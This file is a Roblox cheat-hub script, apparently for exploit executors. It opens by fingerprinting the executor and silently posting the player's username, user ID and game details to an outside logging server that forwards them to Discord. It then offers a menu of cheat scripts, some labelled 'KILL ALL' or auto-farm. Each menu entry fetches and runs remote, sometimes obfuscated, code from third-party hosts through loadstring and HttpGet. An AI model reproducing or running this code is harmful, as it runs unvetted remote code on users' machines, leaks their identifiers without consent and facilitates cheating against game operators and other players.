-- -- Roblox Script Template for Logging Executions
-- Place this code in your exploit script to send execution logs to Discord

local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")

-- Configuration
local LOGGER_URL = "https://a6362121-12f9-4ca3-b2fe-775718e56baf-00-qmesowl1kqj8.riker.replit.dev/log-execution"

-- Detect executor/exploit
local function detectExecutor()
    -- Try getexecutorname first (universal method - works with most executors)
    if getexecutorname then
        local success, name = pcall(getexecutorname)
        if success and name and name ~= "" then
            return name
        end
    end
    
    -- Try identifyexecutor
    if identifyexecutor then
        local success, name = pcall(identifyexecutor)
        if success and name and name ~= "" then
            return name
        end
    end
    
    -- Comprehensive executor detection list (2025)
    local executors = {
        -- PC Executors
        {name = "Synapse X", check = function() return syn or is_syn_loaded or Synapse end},
        {name = "Script-Ware", check = function() return SCRIPT_WARE_VERSION or ScriptWare or is_scriptware end},
        {name = "Krnl", check = function() return KRNL_LOADED or is_krnl_function end},
        {name = "Fluxus", check = function() return FLUXUS_LOADED or Fluxus or fluxus end},
        {name = "Oxygen U", check = function() return is_oxygen_u or OxygenU end},
        {name = "Sentinel", check = function() return is_sentinel_closure or SENTINEL_V2 end},
        {name = "JJSploit", check = function() return JJSploitExploit or jjsploit end},
        {name = "Celery", check = function() return Celery or celery or is_celery end},
        {name = "Nihon", check = function() return Nihon or nihon end},
        {name = "Synergy", check = function() return Synergy or is_synergy end},
        {name = "Xeno", check = function() return Xeno or xeno end},
        {name = "Volcano", check = function() return Volcano or volcano end},
        {name = "Swift", check = function() return Swift or swift end},
        {name = "Feather", check = function() return Feather or feather end},
        
        -- Mobile Executors (Android/iOS)
        {name = "Arceus X Neo", check = function() return AceusXNeo or arceus or is_arceus end},
        {name = "Arceus X", check = function() return getexecutorname and (getexecutorname():lower():find("arceus") or getexecutorname():lower():find("arceusx")) end},
        {name = "Delta", check = function() return Delta or delta or is_delta end},
        {name = "Wave", check = function() return Wave or wave or is_wave end},
        {name = "Codex", check = function() return codex or Codex end},
        {name = "Fluxus Android", check = function() return getexecutorname and getexecutorname():lower():find("fluxus") and (isiOS or isAndroid) end},
        
        -- iOS Specific
        {name = "Delta iOS", check = function() return Delta and isiOS end},
        
        -- Mac Executors
        {name = "Mac Executor", check = function() return isMac end},
        
        -- Other Popular Executors
        {name = "Electron", check = function() return iselectronmm or Electron end},
        {name = "ProtoSmasher", check = function() return is_protosmasher_closure or ProtoSmasher end},
        {name = "Sirhurt", check = function() return is_sirhurt_closure or Sirhurt end},
        {name = "Trigon", check = function() return trigon or Trigon end},
        {name = "Evon", check = function() return evon or Evon end},
        {name = "Hydrogen", check = function() return Hydrogen or hydrogen end},
        {name = "Valyse", check = function() return Valyse or valyse end},
        {name = "NekoV3", check = function() return NekoV3 or neko end},
        {name = "Zorara", check = function() return Zorara or zorara end},
        {name = "Seliware", check = function() return Seliware or seliware end},
        {name = "Coco", check = function() return Coco or coco end},
        {name = "Furk Ultra", check = function() return FurkUltra or furk end},
        {name = "Calamari", check = function() return Calamari or calamari end},
        {name = "Nezur", check = function() return Nezur or nezur end},
        {name = "Paradox", check = function() return Paradox or paradox end},
        {name = "RC7", check = function() return RC7 or rc7 end},
        {name = "Temple", check = function() return Temple or temple end},
        {name = "Vega X", check = function() return VegaX or vegax end},
        {name = "Solaris", check = function() return Solaris or solaris end},
        {name = "Comet", check = function() return Comet or comet end},
        {name = "Incognito", check = function() return Incognito or incognito end},
    }
    
    -- Check for specific executors
    for _, executor in ipairs(executors) do
        local success, result = pcall(executor.check)
        if success and result then
            return executor.name
        end
    end
    
    -- Additional platform checks
    if isiOS then
        return "Unknown iOS Executor"
    elseif isAndroid then
        return "Unknown Android Executor"
    elseif isMac then
        return "Unknown Mac Executor"
    end
    
    return "Unknown Executor"
end

print("🔍 Detecting executor...")
local executor = detectExecutor()
print("📱 Executor detected: " .. executor)

-- Get player information
local player = Players.LocalPlayer
local username = player.Name
local userId = tostring(player.UserId)
print("👤 Player: " .. username .. " (ID: " .. userId .. ")")

-- Get game information
local gameName = "Unknown"
local success, productInfo = pcall(function()
    return game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId)
end)
if success and productInfo then
    gameName = productInfo.Name
end

local gameId = tostring(game.GameId)
local placeId = tostring(game.PlaceId)
print("🎮 Game: " .. gameName .. " (Place ID: " .. placeId .. ")")

-- Create the log data
local logData = {
    username = username,
    userId = userId,
    gameName = gameName,
    gameId = gameId,
    placeId = placeId,
    executor = executor,
    executionTime = os.date("!%Y-%m-%dT%H:%M:%SZ")
}

print("📡 Sending log to Discord...")

-- Send the log to the Discord bot
local success, response = pcall(function()
    return HttpService:PostAsync(
        LOGGER_URL,
        HttpService:JSONEncode(logData),
        Enum.HttpContentType.ApplicationJson,
        false
    )
end)

if success then
    print("✅ Execution logged to Discord successfully!")
    print("Response: " .. tostring(response))
else
    warn("❌ Failed to log execution!")
    warn("Error details: " .. tostring(response))
    warn("Make sure HttpService is enabled in your executor!")
end

-- Your actual exploit code goes below this line
-- ==============================================

print("Script loaded for " .. username)



local starlight = loadstring(game:HttpGet("https://raw.nebulasoftworks.xyz/starlight"))()  
local icons = loadstring(game:HttpGet("https://raw.nebulasoftworks.xyz/nebula-icon-library-loader"))()

local buttons = {}
local trending_scripts = {
    ["plants vs brainrots"] = {
        ["luarmor-plants vs brainrots"] = function() loadstring(game:HttpGet("https://rifton.top/loader.lua"))() end,
    },
    ["grow a garden"] = {
        ["no lag-grow a garden"] = function() loadstring(game:HttpGet(" https://raw.githubusercontent.com/yomiytg/NOLAGHUB/refs/heads/main/Grow%20A%20Gardern "))() end,
    },
    ["script hubs"] = {
        ["zenith hub"] = function() loadstring(game:HttpGet("https://zenithhub.cloud/panel/script"))() end,
    },
    ["99 nights"] = {
        ["voidware-99nights"] = function() loadstring(game:HttpGet("https://raw.githubusercontent.com/VapeVoidware/VW-Add/main/loader.lua", true))() end,
    }
}

local game_scripts = {
    ["blox fruits"] = {
        ["solixhub"] = function() loadstring(game:HttpGet("https://rawscripts.net/raw/GRAVITY-Blox-Fruits-BEST-SCRIPT-SOLARA-AND-XENO-AUTO-V4-AUTO-LEVEL-AUTO-RAID-37566"))() end
    },
    ["dead rails"] = {
        ["Dexxterscripts"] = function() loadstring(game:HttpGet("https://raw.githubusercontent.com/DexxterScripts/Roblox/main/DeadRails.lua"))() end
    },
    ["hypershot"] = {
        ["zephyrhub"] = function() loadstring(game:HttpGet("https://raw.githubusercontent.com/ZephyrOnTop/Main/refs/heads/main/Main"))() end
    },
    ["kings legacy"] = {
        ["fazium"] = function() loadstring(game:HttpGet("https://raw.githubusercontent.com/ZaRdoOx/Fazium-files/main/Loader"))() end
    },
    ["bluelock rivals"] = {
        ["alchemyhub"] = function() loadstring(game:HttpGet("https://scripts.alchemyhub.xyz"))() end
    },
    ["dragon soul"] = {
        ["imp hub"] = function() loadstring(game:HttpGet("https://raw.githubusercontent.com/alan11ago/Hub/refs/heads/main/ImpHub.lua"))() end
    },
    ["blade ball"] = {
        ["plutonium hub"] = function()  loadstring(game:HttpGet("https://raw.githubusercontent.com/PawsThePaw/Plutonium.AA/main/Plutonium.Loader.lua", true))() end
    },
    ["evade"] = {
        ["random"] = function() loadstring(game:HttpGet("https://raw.githubusercontent.com/marcelosero7-cyber/Algolevade/refs/heads/main/obfuscated.lua%20(13).txt"))() end
    },
    ["forsaken"] = {
        ["vapevoidware"] = function() loadstring(game:HttpGet("https://raw.githubusercontent.com/VapeVoidware/VW-Add/main/loader.lua", true))() end
    },
    ["guts and blackpowder"] = {
        ["random"] = function() loadstring(game:HttpGet("https://raw.githubusercontent.com/XaviscoZ/roblox/refs/heads/main/g%26b.lua"))() end
    },
    ["hunty zombies"] = {
        ["kaisenlmao"] = function() loadstring(game:HttpGet("https://raw.githubusercontent.com/kaisenlmao/loader/refs/heads/main/chiyo.lua"))() end
    },
    ["ink games"] = {
        ["vapevoidware"] = function() 
            shared.CustomCommit = "8dd5a2e401a7624d73c2fbf1cd3376ff9d363b89"
            shared.TestingMode = true
            shared.StagingMode = true
            shared.BYPASS_VW_PROTECTION = true
            loadstring(game:HttpGet("https://raw.githubusercontent.com/VapeVoidware/VW-Add/main/inkgame.lua", true))() 
        end
    },
    ["jailbreak"] = {
        ["xChaoticvoid"] = function() loadstring(game:HttpGet(('https://raw.githubusercontent.com/xChaoticVoid/Jailbreak/main/Chaos.lua'), true))() end
    },
    ["murder mystery2"] = {
        ["random"] = function() loadstring(game:HttpGet("https://pastefy.app/LlkfAKqJ/raw"))() end
    },
    ["the strongest battlegrounds"] = {
        ["vexonHub"] = function() loadstring(game:HttpGet("https://raw.githubusercontent.com/DiosDi/VexonHub/refs/heads/main/VexonHub"))() end
    },
    ["doors"] = {
        ["astral hub"] = function() loadstring(game:HttpGet("https://raw.githubusercontent.com/AstralHub/Astral/main/Loader.lua"))() end
    },
    ["fish it"] = {
        ["rifton"] = function() loadstring(game:HttpGet("https://rifton.top/loader.lua"))() end
    },
    ["mad city"] = {
        ["VMChub"] = function() loadstring(game:HttpGet("https://raw.githubusercontent.com/inkdupe/scripts/refs/heads/main/VMChub.lua"))() end
    },
    ["bounty hunter anime eternal"] = {
        ["atherhub"] = function() loadstring(game:HttpGet("https://rawscripts.net/raw/Bounty-Hunter-Anime-Eternal-AtherHub-OVERPOWERED-KILL-ALL-AUTO-DUNGEON-60619"))() end
    }
}

local main_scripts = {
    ["Rifton"] = function() loadstring(game:HttpGet("https://rifton.top/loader.lua"))() end,
    ["NOLAG Hub"] = function() loadstring(game:HttpGet("https://raw.githubusercontent.com/yomiytg/NOLAGHUB/refs/heads/main/Grow%20A%20Gardern"))() end,
    ["Zenith Hub"] = function() loadstring(game:HttpGet("https://zenithhub.cloud/panel/script"))() end,
    ["Vexon Hub"] = function() loadstring(game:HttpGet("https://raw.githubusercontent.com/DiosDi/VexonHub/refs/heads/main/VexonHub"))() end,
    ["xchaoticvoid"] = function() loadstring(game:HttpGet(('https://raw.githubusercontent.com/xChaoticVoid/Jailbreak/main/Chaos.lua'), true))() end,
    ["kaisenlmao"] = function() loadstring(game:HttpGet("https://raw.githubusercontent.com/kaisenlmao/loader/refs/heads/main/chiyo.lua"))() end,
    ["Luarmor Protected"] = function() loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/4f5c7bbe546251d81e9d3554b109008f.lua"))() end,
    ["random"] = function()  loadstring(game:HttpGet("https://raw.githubusercontent.com/marcelosero7-cyber/Algolevade/refs/heads/main/obfuscated.lua%20(13).txt"))() end,
    ["DexxterScripts"] = function() loadstring(game:HttpGet("https://raw.githubusercontent.com/DexxterScripts/Roblox/main/DeadRails.lua"))() end,
    ["SolixHub"] = function() loadstring(game:HttpGet("https://rawscripts.net/raw/GRAVITY-Blox-Fruits-BEST-SCRIPT-SOLARA-AND-XENO-AUTO-V4-AUTO-LEVEL-AUTO-RAID-37566"))() end,
    ["Nicuse Hub"] = function() loadstring(game:HttpGet("https://nicuse.xyz/MainHub.lua"))() end,
    ["astral"] = function() loadstring(game:HttpGet("https://astral.gay/loader.luau"))() end,
    ["BLACK HUB"] = function() loadstring(game:HttpGet("https://raw.githubusercontent.com/Skibidiking123/Fisch1/refs/heads/main/FischMain"))() end,
    ["VMChub"] = function() loadstring(game:HttpGet("https://raw.githubusercontent.com/inkdupe/scripts/refs/heads/main/VMChub.lua"))() end,
    ["BananaHUB"] = function() loadstring(game:HttpGet("https://raw.githubusercontent.com/diepedyt/bui/refs/heads/main/BananaHubLoader.lua"))() end,
    ["Kaopao hub"] = function() loadstring(game:HttpGet("https://raw.githubusercontent.com/KapaoHub/loading/refs/heads/main/KapaoHub"))() end,
    ["alchemyHub"] = function() loadstring(game:HttpGet("https://scripts.alchemyhub.xyz"))() end,
    ["imp hub"] = function() loadstring(game:HttpGet("https://raw.githubusercontent.com/alan11ago/Hub/refs/heads/main/ImpHub.lua"))() end,
    ["fazium"] = function() loadstring(game:HttpGet("https://raw.githubusercontent.com/ZaRdoOx/Fazium-files/main/Loader"))() end,
    ["atherhub"] = function() loadstring(game:HttpGet("https://rawscripts.net/raw/Bounty-Hunter-Anime-Eternal-AtherHub-OVERPOWERED-KILL-ALL-AUTO-DUNGEON-60619"))()end,
    ["polluted Hub"] = function() loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/c9f7b2cda8460f26a85bc14a419b3513.lua"))() end,
    ["Plutonium hub"] = function() loadstring(game:HttpGet("https://raw.githubusercontent.com/PawsThePaw/Plutonium.AA/main/Plutonium.Loader.lua", true))() end,
}

local fun_scripts = {
    ["Infinite Yield"] = function() loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"))() end,
}

local function sort_table(dictionary)
    local sorted_keys = {}
    for key in pairs(dictionary) do
        table.insert(sorted_keys, key)
    end
    
    table.sort(sorted_keys, function(a, b)
        return a:lower() < b:lower()
    end)
    
    return sorted_keys
end

ordered_trending_scripts = sort_table(trending_scripts)
ordered_game_scripts = sort_table(game_scripts)
ordered_main_scripts = sort_table(main_scripts)
ordered_fun_scripts = sort_table(fun_scripts)

local window = starlight:CreateWindow({
    Name = "astral",
    Subtitle = "v1.0",
    Icon = icons:GetIcon("house", "Lucide"),

    LoadingSettings = {
        Title = "astral",
        Subtitle = "welcome to astral hub",
    },

    FileSettings = {
        ConfigFolder = "astral"
    },
})

local main_section = window:CreateTabSection("Main")
local scripts_tab = main_section:CreateTab({
    Name = "Scripts",
    Icon = icons:GetIcon('scroll-text', 'Lucide'),
    Columns = 2,
}, "scripts_tab")
local main_scripts_box = scripts_tab:CreateGroupbox({
    Name = "Main Scripts",
    Column = 1,
}, "main_scripts_box")
local game_scripts_box = scripts_tab:CreateGroupbox({
    Name = "Main Scripts",
    Column = 2,
}, "game_scripts_box")
local trending_scripts_box = scripts_tab:CreateGroupbox({
    Name = "Trending Scripts",
    Column = 2,
}, "trending_scripts_box")
local fun_scripts_box = scripts_tab:CreateGroupbox({
    Name = "Fun Scripts",
    Column = 2,
}, "fun_scripts_box")
local other_box = scripts_tab:CreateGroupbox({
    Name = "Other",
    Column = 2,
}, "other_box")
local discord_button = other_box:CreateButton({
    Name = "Discord",
    Icon = icons:GetIcon("clipboard", "Lucide"),
    Callback = function()
        setclipboard("discord.gg/astralscripts")
        starlight:Notification({
            Title = "Notification",
            Icon = icons:GetIcon('clipboard', 'Lucide'),
            Content = "Discord link copied to clipboard.",
        }, "discprd_notif")
    end
}, "discord_button")

for _, name in ordered_main_scripts do
    buttons[name]= main_scripts_box:CreateButton({
        Name = name,
        Icon = icons:GetIcon('check', 'Lucide'),
        Callback = function()
            main_scripts[name]()
            starlight:Destroy()
        end,
    }, name)
end

for _, game in ordered_trending_scripts do
    for name, func in trending_scripts[game] do
        buttons[name]= trending_scripts_box:CreateButton({
            Name = name,
            Icon = icons:GetIcon('check', 'Lucide'),
            Callback = function()
                func()
                starlight:Destroy()
            end,
        }, name)
    end
end

for _, game in ordered_game_scripts do
    local game_label = game_scripts_box:CreateLabel({
        Name = game
    }, "game_label")
    for name, func in game_scripts[game] do
        buttons[name]= game_scripts_box:CreateButton({
            Name = name,
            Icon = icons:GetIcon('check', 'Lucide'),
            Callback = function()
                func()
                starlight:Destroy()
            end,
        }, name)
    end
    game_scripts_box:CreateDivider()
end

for _, name in ordered_fun_scripts do
    buttons[name]= fun_scripts_box:CreateButton({
        Name = name,
        Icon = icons:GetIcon('check', 'Lucide'),
        Callback = function()
            fun_scripts[name]()
            starlight:Destroy()
        end,
     }, name)
end





